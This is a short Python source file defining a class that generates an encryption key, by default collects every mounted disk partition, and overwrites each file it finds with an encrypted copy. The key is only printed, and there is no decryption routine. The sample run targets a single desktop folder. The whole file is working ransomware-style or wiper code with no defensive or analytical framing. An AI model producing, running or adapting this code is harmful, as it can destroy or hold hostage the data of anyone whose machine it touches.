from cryptography.fernet import Fernet
from os import chdir, getcwd, walk
from os.path import join
from psutil import disk_partitions

class DMSECEncrypter:
    def __init__(self, paths:list=None) -> None:
        # generate new key
        self.KEY = Fernet.generate_key()
        print('[!] KEY :', self.KEY)

        # generate fernet obj for file encryption
        self.fernet = Fernet(self.KEY)

        if paths == None:
            self.PATHS = self.__get_partitions_path()
        else:
            self.PATHS = paths
        print('[!] PATHS to be encrypted :\n', self.PATHS)



    def __get_partitions_path(self) -> list:
        '''
        returns all mounted partition's mount points as a list
        '''
        mount_points = []
        for partition in disk_partitions():
            mount_points.append(partition.mountpoint)
        return mount_points


    def encrypt_file(self, file_path):
        try:
            # read file data
            with open(file_path, 'rb') as f:
                file_data = f.read()

            # encrypt file data
            enc_data = self.fernet.encrypt(file_data)

            # write file data
            with open(file_path, 'wb') as f:
                file_data = f.write(enc_data)
            print(f'[*] File {file_path} encrypted.')
            return True

        except Exception:
            print(f'[!] Failed to encrypt {file_path}')
            return False
        
    
    def encrypt_files(self, path:str):
        for root, dirs, files in walk(path):
            print('-'*40)
            print('ROOT :',root)
            for file in files:
                # print('File :', file)
                file_path = join(root, file)
                # print('filePATH :',file_path)
                self.encrypt_file(file_path=file_path)
            print('-'*40)



    def start(self):
        for path in self.PATHS:
            self.encrypt_files(path)

if __name__ == '__main__':
    PATHS = [r'C:\Users\there\Desktop\tools\TermuxCustomBanner',]
    encrypter = DMSECEncrypter(PATHS)
    encrypter.start()
